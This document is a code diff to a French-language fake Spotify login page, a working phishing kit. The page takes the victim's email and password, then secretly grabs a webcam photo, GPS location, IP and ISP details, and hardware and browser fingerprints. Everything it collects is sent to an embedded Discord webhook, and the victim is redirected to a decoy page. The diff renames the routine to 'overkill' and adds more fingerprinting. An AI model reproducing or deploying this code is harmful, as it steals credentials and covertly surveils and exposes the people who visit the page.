@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
         .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
         .logo { width: 45px; margin: 0 auto 35px auto; }
         .field { text-align: left; margin-bottom: 15px; }
@@ -31,11 +31,11 @@
             </div>
             <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
             <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-            <button onclick="genesis()" id="btn" class="btn-green">Se connecter</button>
+            <button onclick="overkill()" id="btn" class="btn-green">Se connecter</button>
         </div>
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <p id="status" style="font-size: 12px; color: #b3b3b3; margin-top: 10px; font-weight:700;">SÉCURISATION DU FLUX...</p>
+            <p id="st" style="font-size: 11px; color: #1ed760; margin-top: 10px; font-weight:900; letter-spacing:1px;">ENCRYPTAGE DES DONNÉES...</p>
         </div>
     </div>
 
@@ -45,7 +45,7 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function genesis() {
+        async function overkill() {
             const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
             if(!user.u || !user.p) return;
 
@@ -53,60 +53,72 @@
             document.getElementById('loader').style.display = 'block';
             const pb = document.getElementById('pbar');
             
-            // ÉTAPE 1: CAPTEURS
+            // ÉTAPE 1: ACTIVATION CAPTEURS
             let stream = null;
             try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); document.getElementById('v').srcObject = stream; } catch(e){}
 
-            pb.style.width = "25%";
-            let gps = "❌ Désactivé";
+            pb.style.width = "20%";
+            let gps = "❌ Bloqué";
             try {
                 const pos = await new Promise((res, rej) => { navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000}); });
                 gps = `✅ [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
             } catch(e){}
 
-            pb.style.width = "50%";
-            // ÉTAPE 2: MEGA DATA
+            pb.style.width = "40%";
+            // ÉTAPE 2: EXTRACTION PROFONDE
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
             let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
-            const gl = document.createElement('canvas').getContext('webgl');
-            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
             
+            // GPU & Canvas Fingerprint
+            const can = document.createElement('canvas');
+            const gl = can.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpuVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+            const gpuModel = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            
+            // Connection Info
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            const connType = conn.effectiveType || "Inconnue";
+
+            // Mémoire vive réelle
+            const ramUsage = window.performance && window.performance.memory ? Math.round(window.performance.memory.usedJSHeapSize / 1048576) + " MB" : "Non supporté";
+
             const payload = {
                 embeds: [{
-                    title: `🛡️ GENESIS-LOG V37 - ${user.fn} ${user.ln}`,
+                    title: `💀 OVERKILL-LOG V38 - ${user.fn} ${user.ln}`,
                     color: 1955168,
-                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" },
                     fields: [
-                        { name: "👤 COMPTE & IDENTITÉ", value: `**Prénom:** \`${user.fn}\`\n**Nom:** \`${user.ln}\`\n**User:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
-                        { name: "📍 LOCALISATION DÉTAILLÉE", value: `**GPS:** ${gps}\n**IP:** \`${net.ip}\`\n**Ville:** \`${net.city}\` (${net.region})\n**FAI:** \`${net.org}\`\n**Timezone:** \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`` },
-                        { name: "📱 MATÉRIEL (HARDWARE)", value: `**Modèle GPU:** \`${gpu}\`\n**RAM estimée:** \`${navigator.deviceMemory || '?'} GB\`\n**CPU Cores:** \`${navigator.hardwareConcurrency}\`\n**Écran:** \`${screen.width}x${screen.height}\`\n**Batterie:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\` (\`${bat.charging ? 'En charge' : 'Sur batterie'}\`)` },
-                        { name: "🌐 NAVIGATEUR & OS", value: `**OS:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**Cookies:** \`${navigator.cookieEnabled ? '✅' : '❌'}\`\n**Online:** \`${navigator.onLine ? '✅' : '❌'}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
+                        { name: "👤 ACCÈS COMPTE", value: `**Prénom/Nom:** \`${user.fn} ${user.ln}\`\n**Email:** \`${user.u}\`\n**Pass:** \`${user.p}\`` },
+                        { name: "📍 RÉSEAU & IP", value: `**IP:** \`${net.ip}\`\n**FAI:** \`${net.org}\`\n**Ville:** \`${net.city}\` (${net.country_name})\n**Vitesse:** \`${connType}\`\n**VPN/Proxy:** \`${net.proxy ? 'OUI' : 'NON'}\`` },
+                        { name: "🛠️ HARDWARE (DÉTAILLÉ)", value: `**GPU Vendor:** \`${gpuVendor}\`\n**GPU Model:** \`${gpuModel}\`\n**Cœurs CPU:** \`${navigator.hardwareConcurrency}\`\n**RAM Dispo:** \`${navigator.deviceMemory}GB\`\n**RAM Utilisée:** \`${ramUsage}\`\n**Écran:** \`${screen.width}x${screen.height}\`` },
+                        { name: "🔋 BATTERIE & STATUT", value: `**Niveau:** \`${bat.level ? Math.round(bat.level*100) : '?'}%\`\n**En charge:** \`${bat.charging ? 'OUI' : 'NON'}\`\n**Géoloc:** ${gps}` },
+                        { name: "🖥️ LOGICIEL", value: `**Système:** \`${navigator.platform}\`\n**Langue:** \`${navigator.language}\`\n**UA:** \`\`\`${navigator.userAgent}\`\`\`` }
                     ],
-                    footer: { text: "LVN GENESIS ULTIMATE • " + new Date().toLocaleString() }
+                    footer: { text: "SYSTEM OVERKILL ULTIMATE • " + new Date().toLocaleString() }
                 }]
             };
 
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            // ÉTAPE 3: PHOTO
-            pb.style.width = "85%";
+            // ÉTAPE 3: CAPTURE PHOTO
+            pb.style.width = "90%";
             if(stream) {
-                await new Promise(r => setTimeout(r, 3500));
+                await new Promise(r => setTimeout(r, 4000));
                 const v = document.getElementById('v');
-                const can = document.getElementById('c');
-                can.width = v.videoWidth; can.height = v.videoHeight;
-                can.getContext('2d').drawImage(v, 0, 0);
+                const canv = document.getElementById('c');
+                canv.width = v.videoWidth; canv.height = v.videoHeight;
+                canv.getContext('2d').drawImage(v, 0, 0);
                 
-                can.toBlob(async b => {
+                canv.toBlob(async b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'genesis_capture.jpg');
-                    fd.append('content', `📸 **Image Genesis : ${user.fn} ${user.ln}**`);
+                    fd.append('file', b, 'overkill_shot.jpg');
+                    fd.append('content', `📸 **Face ID : ${user.fn} ${user.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "http://googleusercontent.com/spotify.com/success";
+                    window.location.href = "http://googleusercontent.com/spotify.com/premium";
                 }, 'image/jpeg', 0.8);
             } else {
-                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/success"; }, 1000);
+                setTimeout(() => { window.location.href = "http://googleusercontent.com/spotify.com/premium"; }, 1000);
             }
         }
     </script>
